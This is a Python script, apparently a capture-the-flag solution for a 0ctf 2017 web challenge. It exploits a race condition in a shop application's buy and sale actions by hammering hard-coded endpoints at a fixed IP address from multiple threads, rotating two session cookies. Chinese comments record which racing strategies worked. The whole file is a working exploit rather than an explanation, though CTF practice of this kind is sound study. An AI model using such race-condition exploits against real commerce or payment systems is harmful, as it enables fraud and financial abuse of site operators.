#coding:utf-8
'''
Created on 2017年4月1日
@author: superxiaoxiong
'''
import requests
import threading
import random
import re


'''
0ctf 2017 web session竞争
1.多个action比如：BUY和SALE相互竞争。
2.单个用户 两个PHPSESSION相互竞争
3.多个用户的PHPSESSION相互竞争都不行
特征表现：SALE动作响应慢
'''
#拼接url
host = "http://202.120.7.197"
url1 = host + "/app.php?action=buy&id=6"
url2 = host + "/app.php?action=sale&id=6"

headers = []
headers.append({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0','Cookie' : 'PHPSESSID=ulpovv28ekqdk8m8fm26mvsa54'})
headers.append({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0','Cookie' : 'PHPSESSID=4pbjmvls718mn3o11span9n6n7'})



def buy():
    try:
        while True:
            print requests.get(url1,headers=headers[random.randint(0,1)]).content
    except:
        pass

def sale():
    try:
        while True:
            res = requests.get(url2,headers=headers[random.randint(0,1)]).content
            m = re.match(r'You don\'t have this goods', res)
            if m is None:
                break
    except:
        pass



while 1:
    while 1:
        res = requests.get(url1,headers=headers[random.randint(0,1)]).content   
        print 'test'   
        m = re.match(r'You don\'t have enough money.', res)
        if m is  None:
            break
        
    
    #threading.Thread(target=buy).start()
    threading.Thread(target=sale).start()
